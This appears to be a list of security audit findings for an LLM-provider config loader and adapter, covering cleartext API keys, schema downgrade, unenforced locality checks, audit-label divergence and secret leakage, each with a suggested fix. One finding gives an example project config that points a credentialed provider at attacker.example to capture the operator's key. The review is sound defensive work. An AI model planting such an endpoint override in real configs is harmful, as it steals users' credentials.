findings.cross_file_justification: validate_providers admits an http:// endpoint whenever the host matches allow_insecure_endpoint, with no requirement that the provider be keyless; OpenAIAdapter.complete then attaches `Authorization: Bearer <real key>` to every request on that cleartext endpoint.
findings.description: The insecure-endpoint opt-in is independent of `keyless`. A provider configured with `allow_insecure_endpoint: 192.168.1.20`, `endpoint: http://192.168.1.20:8080/v1` and `auth: "{env:OPENAI_API_KEY}"` passes load-time validation, and the adapter sends the resolved API key as a Bearer header over plaintext HTTP (LAN sniffable, logged by any intermediate reverse proxy). The policy module's docstring frames the opt-in as 'a provider that needs no credential', but nothing enforces that coupling.
findings.failure_mode: A hosted-vendor API key is transmitted in cleartext to an RFC1918 host (e.g. a LAN gateway or a mis-pointed proxy), exposing the credential to anyone on the network path.
findings.suggested_fix: In validate_providers, refuse (or at minimum WARN loudly) when `allow_insecure_endpoint` is set on a provider that is not `keyless: true`, or whose `auth` resolves to a non-empty value. Alternatively, have the adapter refuse to attach an Authorization header when the request URL scheme is http.

findings.description: Structured-output enforcement can be downgraded by the remote server. `_names_response_format` treats ANY HTTP 400 whose body contains the substrings `response_format` or `json_schema` (any field, any case) as a schema rejection, and `complete` then re-sends the full prompt once without `response_format`. A hostile or compromised OpenAI-compatible server (the local/third-party servers this cycle is adding support for) can therefore (a) force every request to be sent twice, and (b) strip the strict schema so the tolerant parser / repair loop accepts arbitrary output. The heuristic also fires if the server echoes user-controlled prompt text containing those words in an unrelated 400 error, silently dropping schema enforcement on the retry.
findings.failure_mode: Schema-constrained verdict calls run unenforced at the server's discretion; the prompt (possibly containing sensitive context) is transmitted twice; telemetry records it but the caller's output contract is weakened without an explicit operator decision.
findings.suggested_fix: Narrow the detection to the server's structured error object (e.g. `error.param == 'response_format'` or `error.code` naming unsupported_parameter) rather than a substring scan of the whole body. Consider making the schema-less retry opt-in per model (catalog flag) and surfacing `schema_rejected_by_server` to the caller as a degraded result instead of only to MODELINV.

findings.cross_file_justification: endpoint_policy.py (head) defines validate_local_fallbacks as the fix for audit item a257-1 MEDIUM-A1(b), but the loader.py hunk only imports and calls normalise_keyless and validate_providers; nothing in the shown diff wires validate_local_fallbacks into load_config.
findings.description: Under `hounfour.locality: local_voices`, a `dispatch_group: local` model whose `fallback_chain` names a hosted hop is supposed to be refused at load (validate_local_fallbacks). Based on the diff shown, `load_config` never calls it, so the guarantee that a local-voices run keeps the prompt on-box is not enforced: cheval walks the fallback chain inside one call and would send the prompt to the hosted provider after a local failure (context_window_refused, timeout, 5xx). Could not verify whether another call site exists outside the reviewed hunks.
findings.failure_mode: A prompt intended for a local model under local_voices locality is forwarded to a hosted vendor on fallback, violating the data-locality policy the operator configured.
findings.suggested_fix: Call `validate_local_fallbacks(merged)` immediately after `validate_providers(merged)` in load_config, and add a loader test that a local_voices config with a hosted fallback fails with CONFIG-INVALID.

findings.cross_file_justification: endpoint_policy.hop_is_local is documented as the ONE implementation for cheval's planner, the loader and MODELINV hop_locality, but modelinv.hop_locality_of re-implements the rule by trusting the model entry's dispatch_group label alone.
findings.description: MODELINV `hop_locality` is derived from the raw `dispatch_group == 'local'` label on the model entry. It ignores the provider-block label (which hop_is_local honours), the CLI exclusion, and the endpoint-host check. Two concrete divergences: (1) a provider with `dispatch_group: local` on the provider block is recorded as `hosted` in the audit chain while the planner treats it as local; (2) if `hop_telemetry` is ever fed a hounfour dict that did not pass through load_config (hand-built or stale), a hosted endpoint labelled `local` is recorded as `local`. The audit record is the artifact used to prove data locality after the fact.
findings.failure_mode: The tamper-evident MODELINV chain can assert a locality that differs from what the dispatcher actually did, undermining audit/compliance review of local-vs-hosted routing.
findings.suggested_fix: Have hop_locality_of delegate to `endpoint_policy.hop_is_local(hounfour, provider, model_id)` (returning 'local'/'hosted'), so audit and dispatch share one implementation.

findings.cross_file_justification: load_config now routes every provider endpoint through check_endpoint, which (per its module docstring) deliberately runs 'the full pipeline minus the host allowlist'. The bash callers of the same validator keep the allowlist.
findings.description: The new Python load-time gate admits any public https host for any provider. Because `.loa.config.yaml` is a project-level file (overlaying `hounfour.providers`), a cloned repository can set e.g. `providers.openai.endpoint: https://attacker.example/v1` while keeping `auth: "{env:OPENAI_API_KEY}"`; cheval will then send the operator's real key as a Bearer header to the attacker's host. This is pre-existing on the Python path, but this change is the point where the Python side formalises endpoint policy and explicitly chooses to omit the control the bash path has.
findings.failure_mode: Credential exfiltration via a malicious or tampered project config pointing a credentialed provider at a third-party https host.
findings.suggested_fix: Apply the canonical host allowlist (or a per-provider-type expected-host suffix) for providers whose `auth` is an `{env:...}` reference, allowing overrides only from the user/system config layer, not the project layer; at minimum WARN on load when a credentialed provider's host is not on the allowlist.

findings.description: The adapter-side re-check only runs when `allow_insecure_endpoint` is present. A hand-built or stale config (the case the comment says this re-check exists for) with a plain `http://` or loopback/metadata endpoint and no opt-in is passed to ProviderConfig unchecked, relying entirely on load_config having run. Also, when an opt-in is present but `endpoint` is empty, the opt-in value itself is not validated here.
findings.failure_mode: Defense-in-depth gap: configs that bypass load_config reach the transport with unvalidated endpoints.
findings.suggested_fix: Call `check_endpoint(endpoint, _optin_raw, provider_name)` unconditionally for non-CLI providers with a non-empty endpoint (it returns None when there is no opt-in), and validate a lone opt-in via canonical_optin_host.

findings.description: describe-provider prints the post-interpolation `endpoint` verbatim to stdout (consumed by model-health-probe.sh). The docstring claims it never carries a secret, but an endpoint that embeds an interpolated value (e.g. a gateway token or tenant id in the URL path/query) is emitted as-is. The `_main` error path also prints `str(exc)` for interpolation failures, which can include the offending value.
findings.failure_mode: Secrets embedded in endpoint templates leak into probe logs/CI output.
findings.suggested_fix: Emit only `split_url` scheme/host/port (as destination_for does) rather than the full endpoint, and route load errors through redact_config before printing.
